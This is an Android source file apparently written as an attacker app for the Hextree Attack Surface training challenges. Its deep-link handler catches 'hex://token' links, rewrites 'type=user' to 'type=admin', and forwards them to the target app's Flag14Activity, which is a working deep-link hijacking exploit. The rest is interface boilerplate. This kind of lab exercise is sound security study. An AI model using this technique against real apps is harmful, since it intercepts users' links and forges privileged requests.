package com.example.evilcorp;

import android.content.Intent;
import android.net.Uri;
import android.os.Bundle;
import android.view.View;
import android.widget.Button;
import android.widget.Toast;

import androidx.activity.EdgeToEdge;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.graphics.Insets;
import androidx.core.view.ViewCompat;
import androidx.core.view.WindowInsetsCompat;

public class DeeplinksActivity extends AppCompatActivity {

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        EdgeToEdge.enable(this);
        setContentView(R.layout.activity_deeplinks);
        ViewCompat.setOnApplyWindowInsetsListener(findViewById(R.id.main), (v, insets) -> {
            Insets systemBars = insets.getInsets(WindowInsetsCompat.Type.systemBars());
            v.setPadding(systemBars.left, systemBars.top, systemBars.right, systemBars.bottom);
            return insets;
        });


    // Back button
        Button btnToMain = findViewById(R.id.DeeplinksBackButton);
        btnToMain.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                Intent intent = new Intent(DeeplinksActivity.this, MainActivity.class);
                startActivity(intent);
            }
        });


        //Flag 13
        Button flag13Button = findViewById(R.id.flag13Button);
        flag13Button.setOnClickListener(v -> {
            Toast.makeText(this, "Check the corresponding challenge activity in Hextree Attack Surface app.", Toast.LENGTH_SHORT).show();
        });


        // Flag14 Activity, Hijacking deeplinks

        handleIncomingDeepLink(getIntent());


        //Flag 15
        Button flag15Button = findViewById(R.id.flag15Button);
        flag15Button.setOnClickListener(v -> {
            Toast.makeText(this, "Check the corresponding challenge activity in Hextree Attack Surface app.", Toast.LENGTH_SHORT).show();
        });

        //Flag 16
        Button flag16Button = findViewById(R.id.SUPERIMPORTANT);
        flag16Button.setOnClickListener(v -> {
            Toast.makeText(this, "Just for decoration ;-)", Toast.LENGTH_SHORT).show();
        });

    }

    @Override
    protected void onNewIntent(android.content.Intent intent) {
        super.onNewIntent(intent);
        setIntent(intent);
        handleIncomingDeepLink(intent);
    }
    private void handleIncomingDeepLink(android.content.Intent intent) {
        android.widget.TextView textViewContents = findViewById(R.id.textView3); // Replace with your TextView ID if different


        //to receive deeplink and show its details.

        if (intent != null && android.content.Intent.ACTION_VIEW.equals(intent.getAction()) && intent.getData() != null) {
            // to show popup with the Deeplink intent values
            Utils.showDialog(this, intent);

            //
            Uri data = intent.getData();

            if (data != null && "hex".equals(data.getScheme()) && "token".equals(data.getHost())){

                Intent forwardIntent = new Intent();
                forwardIntent.fillIn(intent, Intent.FILL_IN_DATA | Intent.FILL_IN_ACTION | Intent.FILL_IN_CATEGORIES);

                String editType = forwardIntent.getDataString().replace("type=user","type=admin");

                forwardIntent.setData(Uri.parse(editType));

                forwardIntent.setClassName("io.hextree.attacksurface", "io.hextree.attacksurface.activities.Flag14Activity");

                startActivity(forwardIntent);
                finish();
            }



        } else if (textViewContents != null) {
            textViewContents.setText("No deep link data detected.");
        }



    }
}